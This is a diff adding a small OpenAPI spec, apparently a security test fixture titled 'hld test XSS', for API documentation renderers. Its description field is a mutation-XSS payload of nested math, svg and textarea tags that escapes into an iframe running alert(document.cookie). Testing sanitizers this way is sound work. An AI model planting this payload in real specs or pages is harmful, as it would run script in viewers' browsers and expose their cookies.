@@ -1,0 +1,6 @@
+openapi: "3.0.0"
+
+info:
+  title: hld test XSS
+  description:
+    <math><mi><table><mglyph><svg><mtext><textarea><a title="</textarea><iframe onload='alert(document.cookie)'>"></a></textarea></mtext></svg></mglyph></table></mi></math>
